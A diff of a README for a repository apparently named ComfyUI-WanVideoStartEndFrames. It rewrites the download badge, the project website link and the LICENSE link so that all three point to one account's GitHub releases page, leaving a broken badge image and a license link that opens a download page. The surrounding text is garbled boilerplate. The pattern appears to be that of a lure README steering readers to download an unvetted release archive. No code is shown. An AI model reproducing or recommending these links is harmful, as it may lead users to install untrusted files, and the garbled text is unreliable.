@@ -14,7 +14,7 @@ Welcome to the ComfyUI-WanVideoStartEndFrames repository, where you can find sta
 
 You can download the latest release from the following link: 
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/camiilevitoriia/ComfyUI-WanVideoStartEndFrames/releases)](https://github.com/camiilevitoriia/ComfyUI-WanVideoStartEndFrames/releases)
 
 Make sure to extract the downloaded file if it ends with a file name to access the contents.
 
@@ -29,7 +29,7 @@ If the provided link doesn't work or if you need more options, please visit the 
 
 ## Resources
 
-For more information, tutorials, and updates, visit the [ComfyUI-WanVideoStartEndFrames website](https://www.comfyui-wanvideostartendframes.com).
+For more information, tutorials, and updates, visit the [ComfyUI-WanVideoStartEndFrames website](https://github.com/camiilevitoriia/ComfyUI-WanVideoStartEndFrames/releases).
 
 ## Contribution
 
@@ -37,7 +37,7 @@ Feel free to contribute to the project by forking the repository, making changes
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/ComfyUI-WanVideoStartEndFrames/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/camiilevitoriia/ComfyUI-WanVideoStartEndFrames/releases](https://github.com/camiilevitoriia/ComfyUI-WanVideoStartEndFrames/releases) file for details.
 
 ---
 
